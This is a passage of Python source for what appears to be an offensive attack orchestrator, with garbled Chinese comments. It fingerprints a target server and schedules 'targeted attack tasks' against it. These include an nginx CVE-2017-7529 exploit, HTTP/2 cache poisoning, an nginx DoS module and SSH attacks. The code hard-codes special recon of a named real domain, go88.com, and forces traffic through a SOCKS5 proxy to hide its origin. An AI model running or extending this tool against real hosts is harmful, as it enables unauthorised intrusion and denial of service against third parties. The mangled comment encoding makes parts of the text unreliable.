            # æå–å¯èƒ½çš„ç›®æ ‡åŸŸåï¼ˆä¼˜å…ˆä½¿ç”¨ go88.comï¼‰
            target_domain = None
            extracted_intel = self.intel.data.get('extracted', {})
            for domain in extracted_intel.get('san_domains', []):
                if 'go88' in domain.lower():
                    target_domain = domain
                    break
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_cve_2017_7529, 'cve_2017_7529', self.host, self.tls_port, self.timeout, target_domain)
            ))
        
        # æ–°å¢ï¼šgo88.com ä¸“é¡¹ä¾¦å¯Ÿ
        if 'go88_recon' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_go88_recon, 'go88_recon', self.host, self.timeout)
            ))

        # æ‰§è¡Œç²¾ç¡®æ‰“å‡»é˜¶æ®µ
        if parallel_tasks:
            self.logger.info(f"Starting {len(parallel_tasks)} targeted attack tasks...")
            start_parallel = time.perf_counter()
            done = await asyncio.gather(*parallel_tasks, return_exceptions=True)
            parallel_duration = (time.perf_counter() - start_parallel) * 1000
            self.logger.info(f"Targeted execution completed in {parallel_duration:.0f}ms")
            
            for res in done:
                if isinstance(res, PhaseResult):
                    results['phases'][res.name] = self._pack(res)
                    if res.name == 'certificate_attacks' and res.success:
                        cert_ctx = res.data
                        # ç®€å•æƒ…æŠ¥æ”¶é›†
                        self.intel.set('certificate_attacks', res.data)
                        domains = self.intel.get_san_domains()
                        if domains:
                            self.logger.info(f"Certificate intel: {len(domains)} domains discovered")
                            print(f"[INTEL] Certificate domains: {domains}")
                            # ç«‹å³æ£€æŸ¥go88åŸŸåå¹¶è§¦å‘ä¾¦å¯Ÿ
                            for domain in domains:
                                if 'go88' in domain.lower():
                                    self.logger.info(f"[!] go88.com domain found in cert - scheduling recon")
                                    print(f"[INTEL] [!] GO88 domain detected: {domain}")
                                    print(f"[INTEL] [*] Scheduling go88_recon module...")
                                    self._task_queue.append({'phase': 'go88_recon'})
                    if not res.success and res.error:
                        results['errors'][res.name] = res.error
                        self.logger.warning(f"Phase {res.name} failed: {res.error[:100]}")
                else:
                    # Unexpected exception container
                    results['errors']['targeted_execution'] = str(res)
                    self.logger.error(f"Targeted execution error: {res}")

            # äº‹ä»¶é©±åŠ¨çš„åŠ¨æ€ä»»åŠ¡è°ƒåº¦
            self._process_events_and_schedule()
            await self._run_dynamic_tasks(results)

        # Summarize risk (simple heuristic: highest risk from known phases)
        results['summary'] = self._summarize(results)
        self._emit_jsonl({
            'timestamp': _now_iso(),
            'event': 'orchestrator_end',
            'host': self.host,
            'summary': results.get('summary', {}),
            'errors': results.get('errors', {}),
        })
        self.logger.info(f"orchestrator_end host={self.host} risk={results.get('summary',{}).get('overall_risk','UNKNOWN')}")
        
        #  SYSTEM REFACTORING: Cleanup shared protocol clients
        if SHARED_CLIENT_AVAILABLE:
            try:
                await cleanup_shared_clients()
                self.logger.debug("Shared protocol clients cleaned up successfully")
            except Exception as e:
                self.logger.warning(f"Error cleaning up shared clients: {e}")
        
        return results

    def _pack(self, pr: PhaseResult) -> Dict[str, Any]:
        return {
            'success': pr.success,
            'duration_ms': pr.duration_ms,
            'error': pr.error,
            'data': pr.data,
        }

    def _extract_intelligence(self, fingerprint_res: PhaseResult, proto_norm_res: PhaseResult) -> Dict[str, Any]:
        """ä»åˆå§‹é˜¶æ®µçš„ç»“æœä¸­æå–å…³é”®æƒ…æŠ¥"""
        intel = {'server_type': 'unknown', 'h2_supported': False, 'h3_advertised': False, 
                 'nginx_version': None, 'san_domains': []}

        # ä» fingerprinting è·å–æœåŠ¡å™¨ç±»å‹
        if fingerprint_res.success and fingerprint_res.data:
            # å°è¯•ä»ä¸åŒçš„æŒ‡çº¹ç»“æœä¸­æå–æœåŠ¡å™¨ä¿¡æ¯
            if 'http_fp' in fingerprint_res.data:
                http_fp_results = fingerprint_res.data['http_fp']
                if isinstance(http_fp_results, list):
                    for result in http_fp_results:
                        # result format: [name, status, server, detail, xcache, took]
                        if len(result) > 2 and result[2]:
                            server_header = result[2]
                            intel['server_type'] = server_header.lower()
                            # æå– nginx ç‰ˆæœ¬å·
                            if 'nginx/' in server_header.lower():
                                version_match = re.search(r'nginx/(\d+\.\d+\.\d+)', server_header, re.IGNORECASE)
                                if version_match:
                                    intel['nginx_version'] = version_match.group(1)
                            break
            
            # ä» cert_rebel_probe ä¸­è·å–è¯ä¹¦ä¿¡æ¯
            if 'cert_rebel_probe' in fingerprint_res.data and 'result' in fingerprint_res.data['cert_rebel_probe']:
                cert_data = fingerprint_res.data['cert_rebel_probe']['result']
                if isinstance(cert_data, tuple) and len(cert_data) >= 1:
                    tls_rows = cert_data[0]
                    if isinstance(tls_rows, list) and tls_rows:
                        # æå– SAN åŸŸå - å¢å¼ºæ£€æµ‹é€»è¾‘
                        for row in tls_rows:
                            # SANä¿¡æ¯å¯èƒ½åœ¨ä¸åŒå­—æ®µï¼Œéœ€è¦æ£€æŸ¥æ‰€æœ‰å­—æ®µ
                            for field in row:
                                field_str = str(field)
                                if 'DNS:' in field_str:
                                    domains = re.findall(r'DNS:([^\s,]+)', field_str)
                                    intel['san_domains'].extend(domains)
                                # ä¹Ÿæ£€æŸ¥ç›´æ¥çš„åŸŸåæ ¼å¼
                                elif any(x in field_str.lower() for x in ['go88', '.com', '.net', '.org']):
                                    # å¯èƒ½æ˜¯ç›´æ¥çš„åŸŸå
                                    if '.' in field_str and len(field_str) < 100:
                                        intel['san_domains'].append(field_str.strip())
                        
                        # ä»cert_sociologyçš„æ—¥å¿—ä¸­ç›´æ¥æå–ï¼ˆå¤‡ç”¨æ–¹æ¡ˆï¼‰
                        # å¦‚æœä¸Šé¢æ²¡æ‰¾åˆ°ï¼Œä»ç°æœ‰æ•°æ®ä¸­æŸ¥æ‰¾
                        if not intel['san_domains']:
                            # æ£€æŸ¥æ˜¯å¦æœ‰go88.comçš„è¿¹è±¡
                            cert_str = str(cert_data)
                            if 'go88.com' in cert_str:
                                intel['san_domains'].append('go88.com')
                                self.logger.info("[*] Found go88.com in certificate data")
        
        # ä» proto_norm_diff è·å–åè®®æ”¯æŒæƒ…å†µ
        if proto_norm_res.success and proto_norm_res.data:
            survey_data = proto_norm_res.data.get('survey', {})
            intel['h2_supported'] = survey_data.get('h2_supported', False)
            intel['h3_advertised'] = survey_data.get('h3_advertised', False)
            # ä¼˜å…ˆä½¿ç”¨ survey ç»“æœè¦†ç›– fingerprint çš„ server ç±»å‹
            if survey_data.get('server'):
                server_header = survey_data['server']
                intel['server_type'] = server_header.lower()
                # å†æ¬¡æå– nginx ç‰ˆæœ¬
                if 'nginx/' in server_header.lower() and not intel['nginx_version']:
                    version_match = re.search(r'nginx/(\d+\.\d+\.\d+)', server_header, re.IGNORECASE)
                    if version_match:
                        intel['nginx_version'] = version_match.group(1)
        
        return intel

    def _plan_next_phases(self, intel: Dict[str, Any]) -> List[str]:
        """æ ¹æ®æƒ…æŠ¥è§„åˆ’ä¸‹ä¸€é˜¶æ®µè¦æ‰§è¡Œçš„æ¨¡å—"""
        planned_phases = []
        
        server_type = intel.get('server_type', 'unknown')
        h2_supported = intel.get('h2_supported', False)
        nginx_version = intel.get('nginx_version')
        san_domains = intel.get('san_domains', [])

        # æ™ºèƒ½å†³ç­–ï¼šä¼ ç»ŸNginxæœåŠ¡å™¨ä¼˜åŒ–
        is_traditional_nginx = 'nginx' in server_type and nginx_version
        
        # è§„åˆ™1: H2æ”¯æŒæ£€æµ‹ - ç›¸ä¿¡æ¢æµ‹ç»“æœ
        if h2_supported:
            if 'h2_continuation' in self.enable_phases: 
                planned_phases.append('h2_continuation')
            if 'h2_cache_poisoning' in self.enable_phases: 
                planned_phases.append('h2_cache_poisoning')
            if 'grpc_trailer_poisoning' in self.enable_phases: 
                planned_phases.append('grpc_trailer_poisoning')
        
        # è§„åˆ™2: CVEæ”»å‡»æ£€æµ‹
        if 'nginx' in server_type and nginx_version and 'cve_2017_7529' in self.enable_phases:
            try:
                major, minor, patch = map(int, nginx_version.split('.'))
                if (major == 1 and minor == 12 and patch == 2) or \
                   (major == 1 and minor == 13 and patch <= 2):
                    planned_phases.append('cve_2017_7529')
                    self.logger.info(f"[!] Detected vulnerable nginx version: {nginx_version}")
            except:
                pass
        
        # è§„åˆ™3: Nginxä¸“é¡¹æµ‹è¯•
        if 'nginx' in server_type and 'nginx_dos_sandwich' in self.enable_phases: 
            planned_phases.append('nginx_dos_sandwich')
            
        # è§„åˆ™4: å¯†ç å­¦æ”»å‡»ï¼ˆä¼ ç»Ÿnginxä¹Ÿè¦æµ‹è¯•ï¼Œä¸è¦è‡ªä½œèªæ˜è·³è¿‡ï¼‰
        crypto_attacks = ['certificate_attacks', 'elliptic_curve_aoe']
        for attack in crypto_attacks:
            if attack in self.enable_phases:
                planned_phases.append(attack)
        
        # è§„åˆ™5: go88.comåŸŸåå‘ç°è§¦å‘ä¸“é¡¹ä¾¦å¯Ÿ
        if san_domains and 'go88_recon' in self.enable_phases:
            for domain in san_domains:
                if 'go88' in domain.lower():
                    planned_phases.append('go88_recon')
                    self.logger.info(f"[!] Detected go88.com related domain: {domain}")
                    break
        
        # è§„åˆ™6: äº‘åŸç”Ÿæ¶æ„æ£€æµ‹ï¼ˆä»…å½“æ˜ç¡®énginxæ—¶ï¼‰
        is_likely_cloud_native = h2_supported and not ('nginx' in server_type or 'apache' in server_type)
        if is_likely_cloud_native:
            if 'xds_analysis' in self.enable_phases: 
                planned_phases.append('xds_analysis')
            if 'wasm_runtime' in self.enable_phases: 
                planned_phases.append('wasm_runtime')

        # è§„åˆ™7: è½»é‡çº§æ ¸å¿ƒæ”»å‡»ï¼ˆæ€»æ˜¯è¿è¡Œï¼‰
        lightweight_attacks = ['tls13_psk_crossbind', 'ocsp_validation']
        for attack in lightweight_attacks:
            if attack in self.enable_phases:
                planned_phases.append(attack)

        # è§„åˆ™8: åè®®å·®å¼‚åŒ–åˆ†æï¼ˆæ€»æ˜¯è¿è¡Œï¼‰
        if 'proto_norm_diff' in self.enable_phases:
             planned_phases.append('proto_norm_diff')

        # è§„åˆ™9: SSHæ”»å‡»ï¼ˆå¿«é€Ÿå¤±è´¥ï¼‰
        if 'time_mch_first_door' in self.enable_phases:
            planned_phases.append('time_mch_first_door')

        return list(set(planned_phases))

    async def _critical_proxy_check(self) -> Dict[str, Any]:
        """ä¸¥æ ¼çš„ä»£ç†éªŒè¯ - å¤±è´¥åˆ™ä¸­æ–­æ•´ä¸ªå·¥å…·é“¾"""
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        #  ç¡®ä¿SOCKSæ”¯æŒå¯ç”¨
        try:
            import urllib3.contrib.socks
        except ImportError:
            try:
                import socks
            except ImportError:
                self.logger.warning("SOCKSæ”¯æŒåº“æœªå®‰è£…ï¼Œå¯èƒ½å½±å“ä»£ç†è¿æ¥")
                pass
        
        result = {'success': False, 'current_ip': None, 'geo_location': 'Unknown', 'error': None}
        
        try:
            #  ä¿®å¤ä»£ç†URLæ ¼å¼ - å¤„ç†ç¼ºå°‘å¯†ç çš„æƒ…å†µ
            fixed_proxy_url = self._fix_proxy_url_format(self.proxy_url)
            
            session = requests.Session()
            session.verify = False
            session.proxies = {'http': fixed_proxy_url, 'https': fixed_proxy_url}
            session.timeout = 15  # å¢åŠ è¶…æ—¶æ—¶é—´
            
            #  å°è¯•ç¬¬ä¸€æ¬¡è¿æ¥
            try:
                resp = session.get('https://httpbin.org/ip', timeout=15)
                result['current_ip'] = resp.json().get('origin', 'unknown')
                print(f"[+] ä»£ç†è®¤è¯æˆåŠŸ: {result['current_ip']}")
                
            except Exception as auth_error:
                # å¦‚æœè®¤è¯å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨é»˜è®¤ä»£ç†
                self.logger.warning(f"[PROXY] ç”¨æˆ·ä»£ç†å¤±è´¥: {auth_error}")
                print(f"[!] ç”¨æˆ·ä»£ç†è®¤è¯å¤±è´¥ï¼Œå°è¯•é»˜è®¤ä»£ç†...")
                
                try:
                    import fingerprint_proxy
                    if hasattr(fingerprint_proxy, 'PROXY_URL') and fingerprint_proxy.PROXY_URL:
                        fallback_proxy = fingerprint_proxy.PROXY_URL
                        session.proxies = {'http': fallback_proxy, 'https': fallback_proxy}
                        resp = session.get('https://httpbin.org/ip', timeout=15)
                        result['current_ip'] = resp.json().get('origin', 'unknown')
                        print(f"[+] é»˜è®¤ä»£ç†æˆåŠŸ: {result['current_ip']}")
                        fixed_proxy_url = fallback_proxy
                except Exception as fallback_error:
                    raise auth_error  # æŠ›å‡ºåŸå§‹é”™è¯¯
            
            # é…ç½®é‡è¯•ç­–ç•¥
            retry_strategy = Retry(
                total=2,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )
            adapter = HTTPAdapter(max_retries=retry_strategy)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            print(f"[+] æœ€ç»ˆä½¿ç”¨ä»£ç†: {fixed_proxy_url[:50]}***")
            
            # ä»£ç†å¯ç”¨æ€§å·²é€šè¿‡httpbin.orgéªŒè¯ï¼Œæ— éœ€å†æ£€æŸ¥ç›®æ ‡å¯è¾¾æ€§
            result['success'] = True
            print(f"[+] ä»£ç†è‡ªæ£€é€šè¿‡!")
                
        except Exception as e:
            result['error'] = str(e)
            
        return result
    
    def _fix_proxy_url_format(self, proxy_url: str) -> str:
        """ä¿®å¤ä»£ç†URLæ ¼å¼ï¼Œå¤„ç†ç¼ºå°‘å¯†ç æˆ–å¯†ç è¢«éšè—çš„æƒ…å†µ"""
        if not proxy_url or not proxy_url.startswith('socks5://'):
            return proxy_url
            
        try:
            #  å¤„ç†å¯†ç è¢«***éšè—çš„æƒ…å†µ
            if '***@' in proxy_url:
                # ä»fingerprint_proxy.pyè·å–çœŸå®çš„ä»£ç†URL
                try:
                    import fingerprint_proxy
                    if hasattr(fingerprint_proxy, 'PROXY_URL') and fingerprint_proxy.PROXY_URL:
                        real_proxy = fingerprint_proxy.PROXY_URL
                        self.logger.info(f"[PROXY] Using real proxy URL from fingerprint_proxy")
                        return real_proxy
                except Exception:
                    pass
                
                # å¦‚æœæ‰¾ä¸åˆ°çœŸå®URLï¼Œå°è¯•æ— è®¤è¯è¿æ¥
                parts = proxy_url.split('***@')
                if len(parts) == 2:
                    host_port = parts[1]
                    no_auth_url = f"socks5://{host_port}"
                    self.logger.info(f"[PROXY] Trying no-auth connection to {host_port}")
                    return no_auth_url
            
            # è§£æä»£ç†URL
            import urllib.parse
            parsed = urllib.parse.urlparse(proxy_url)
            
            # å¦‚æœæ²¡æœ‰å¯†ç ï¼Œæ·»åŠ ç©ºå¯†ç 
            if parsed.username and not parsed.password:
                # æ ¼å¼ï¼šsocks5://username@host:port -> socks5://username:@host:port  
                fixed_url = f"socks5://{parsed.username}:@{parsed.hostname}:{parsed.port}"
                self.logger.info(f"[PROXY] Fixed URL format: added empty password")
                return fixed_url
            
            return proxy_url
            
        except Exception as e:
            self.logger.warning(f"[PROXY] URL parsing failed: {e}, using original")
            return proxy_url

    def _summarize(self, results: Dict[str, Any]) -> Dict[str, Any]:
        # Pull risk markers from known phase structures if present
        risk_levels = []
        phases = results.get('phases', {})

        def _phase_level(phase_data: Dict[str, Any]) -> Optional[str]:
            data = phase_data.get('data', {})
            # Common fields across modules
            for key in ('risk_level', 'overall_risk'):
                if key in data:
                    return data[key]
            # Nested locations
            for k in ('summary', 'overall_assessment', 'risk_assessment'):
                if isinstance(data.get(k), dict):
                    if 'risk_level' in data[k]:
                        return data[k]['risk_level']
                    if 'overall_risk' in data[k]:
                        return data[k]['overall_risk']
            return None

        for name, pdata in phases.items():
            lvl = _phase_level(pdata)
            if isinstance(lvl, str):
                risk_levels.append(lvl.upper())

        priority = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'MINIMAL', 'NONE']
        overall = 'NONE'
        for p in priority:
            if p in risk_levels:
                overall = p
                break

        # ç®€å•æƒ…æŠ¥å¢å¼º
        summary = {
            'overall_risk': overall,
            'phase_count': len(phases),
            'errors': len(results.get('errors') or {}),
            'server_type': self.intel.get_server_type(),
            'domains_found': len(self.intel.get_san_domains())
        }
        
        return summary


# -------- CLI --------

async def _main_async():
    import argparse
    parser = argparse.ArgumentParser(description='Integrated Orchestrator for Security Modules')
    parser.add_argument('host', help='Target hostname')
    parser.add_argument('--ip', help='Target IP address (bypass DNS resolution)')
    parser.add_argument('--tls-port', type=int, default=443, help='TLS port (default: 443)')
    parser.add_argument('--http-port', type=int, default=80, help='HTTP port (default: 80)')
    parser.add_argument('--grpc-port', type=int, default=443, help='gRPC port (default: 443)')
    parser.add_argument('--xds-port', type=int, default=15000, help='xDS port (default: 15000)')
    parser.add_argument('--ssh-port', type=int, default=22000, help='SSH port (default: 22000)')
    parser.add_argument('--timeout', type=float, default=90.0, help='Per-phase timeout seconds (default: 90.0)')
    parser.add_argument('--posture', choices=['intelligent', 'deep', 'paranoid'], default='intelligent', help='Wasm analysis posture')
    parser.add_argument('--sni-list', nargs='+', help='SNI list for TLS 1.3 PSK cross-binding')
    parser.add_argument('--ec-protocols', nargs='+', choices=['tls', 'jwt', 'mtls', 'api_gateway', 'oauth'], help='EC-AOE protocols to test')
    parser.add_argument('--phases', nargs='+', help='Limit to specific phases by name')
    parser.add_argument('--output', '-o', help='Write JSON results to file')
    parser.add_argument('--format', choices=['json', 'report'], default='report', help='Output format (default: report)')
    parser.add_argument('--jsonl-file', help='Append structured events (JSONL) to this file')
    parser.add_argument('--log-file', help='Write orchestrator logs to this file (default: stdout)')
    parser.add_argument('--proxy-file', default='s5url.txt', help='File containing SOCKS5 proxy URL (default: s5url.txt)')
    parser.add_argument('--force-proxy', action='store_true', default=True, help='Force proxy usage - abort if proxy fails (default: True)')
    parser.add_argument('--no-force-proxy', action='store_true', help='Disable force proxy mode')

    args = parser.parse_args()

    # å¤„ç†force_proxyé€»è¾‘
    force_proxy_mode = args.force_proxy and not args.no_force_proxy
    
    if force_proxy_mode:
        print(f"[!] å¼ºåˆ¶ä»£ç†æ¨¡å¼ï¼šON (--force-proxy)")
    else:
        print(f"[*] å¼ºåˆ¶ä»£ç†æ¨¡å¼ï¼šOFF (use --no-force-proxy to disable)")
    
    orch = IntegratedOrchestrator(
        host=args.host,
        ip=args.ip,
        tls_port=args.tls_port,
        http_port=args.http_port,
        grpc_port=args.grpc_port,
        xds_port=args.xds_port,
        ssh_port=args.ssh_port,
        timeout=args.timeout,
        posture=args.posture,
        sni_list=args.sni_list,
        ec_protocols=args.ec_protocols,
        enable_phases=args.phases,
        jsonl_file=args.jsonl_file,
        log_file=args.log_file,
        proxy_url=_load_proxy_from_file(args.proxy_file) if not args.no_force_proxy else None,
        force_proxy=force_proxy_mode,
    )

    results = await orch.run()

    if args.format == 'json':
        out = json.dumps(results, indent=2, ensure_ascii=False, default=str)
    else:
        # è¯¦ç»†äººç±»å¯è¯»æŠ¥å‘Š
        summary = results.get('summary', {})
        phases = results.get('phases', {})
        errors = results.get('errors', {})
        target = results.get('target', {})
        
        lines = []
        lines.append('=' * 80)
        lines.append(' INTEGRATED SECURITY ASSESSMENT REPORT')
        lines.append('=' * 80)
        lines.append(f" Target: {target.get('host', 'Unknown')}")
        lines.append(f" Ports: TLS:{target.get('tls_port', 443)} HTTP:{target.get('http_port', 80)} SSH:{target.get('ssh_port', 22000)} gRPC:{target.get('grpc_port', 443)}")
        lines.append(f" Time: {results.get('timestamp', 'Unknown')}")
        lines.append(f" Overall Risk: {summary.get('overall_risk', 'UNKNOWN')}")
        lines.append(f" Status: {summary.get('phase_count', 0)} phases, {summary.get('errors', 0)} errors")
        lines.append('')
        
        # æ˜¾ç¤ºæ¯ä¸ªé˜¶æ®µçš„ç»“æœ
        lines.append(' PHASE RESULTS:')
        lines.append('-' * 50)
        for phase_name, phase_data in phases.items():
            risk = 'UNKNOWN'
            findings_count = 0
            details = ""
            
            if isinstance(phase_data, dict):
                # å°è¯•æå–é£é™©ç­‰çº§å’Œå‘ç°æ•°é‡
                if 'risk_level' in phase_data:
                    risk = phase_data['risk_level']
                elif 'overall_risk' in phase_data:
                    risk = phase_data['overall_risk']
                if 'findings' in phase_data:
                    findings_count = len(phase_data.get('findings', []))
                elif 'vulnerabilities' in phase_data:
                    findings_count = len(phase_data.get('vulnerabilities', []))
                
                # ç‰¹æ®Šå¤„ç†æŒ‡çº¹æ¨¡å—çš„è¯¦ç»†ä¿¡æ¯
                if phase_name == 'fingerprint':
                    fp_details = []
                    if 'data' in phase_data and 'ssh_fp' in phase_data['data'] and 'result' in phase_data['data']['ssh_fp']:
                        fp_details.append(f"SSH:{len(phase_data['data']['ssh_fp']['result'])}T")
                    if 'data' in phase_data and 'tls_fp' in phase_data['data'] and 'result' in phase_data['data']['tls_fp']:
                        fp_details.append(f"TLS:{len(phase_data['data']['tls_fp']['result'])}T")
                    if 'data' in phase_data and 'http_fp' in phase_data['data'] and 'result' in phase_data['data']['http_fp']:
                        fp_details.append(f"HTTP:{len(phase_data['data']['http_fp']['result'])}P")
                    if 'data' in phase_data and 'cert_rebel_probe' in phase_data['data'] and 'result' in phase_data['data']['cert_rebel_probe']:
                        cert_data = phase_data['data']['cert_rebel_probe']['result']
                        if isinstance(cert_data, tuple) and len(cert_data) >= 2:
                            fp_details.append(f"CERT:{len(cert_data[0])}C")
                    if fp_details:
                        details = f" [{'/'.join(fp_details)}]"
                        risk = 'COLLECTED'
                        
                # ç®€å•æƒ…æŠ¥é©±åŠ¨çš„phaseä¿¡æ¯å¢å¼º
                elif phase_name == 'certificate_attacks':
                    domains = orch.intel.get_san_domains()
                    if domains:
                        details = f" [{len(domains)}domains]"
            
            lines.append(f"   {phase_name}: {risk}{details} ({findings_count} findings)")
        
        # æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼ˆå¦‚æœæœ‰ï¼‰
        if errors:
            lines.append('')
            lines.append(' ERRORS:')
            lines.append('-' * 50)
            for phase_name, error_msg in errors.items():
                lines.append(f"   {phase_name}: {str(error_msg)[:100]}...")
        
        lines.append('')
        lines.append('=' * 80)
        out = '\n'.join(lines)

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(out)
        print(f"Results written to: {args.output}")
    else:
        print(out)

    # Exit code based on overall risk
    risk = (results.get('summary') or {}).get('overall_risk', 'NONE')
    mapping = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'MINIMAL': 0, 'NONE': 0}
    sys.exit(mapping.get(risk, 0))


def main():
    if sys.platform == 'win32':
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass
    asyncio.run(_main_async())


if __name__ == '__main__':
    main()

